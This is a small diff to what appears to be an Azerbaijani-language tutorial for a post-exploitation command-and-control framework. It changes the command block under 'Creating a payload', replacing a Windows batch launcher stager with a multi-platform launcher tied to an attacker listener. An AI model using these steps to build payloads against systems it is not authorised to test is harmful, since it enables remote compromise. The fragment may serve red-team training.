@@ -68,7 +68,7 @@ execute
 ## 💣 6. Payload yaratmaq
 
 ```bash
-usestager windows/launcher_bat
+usestager multi/launcher
 set Listener mylistener
 execute
 ```
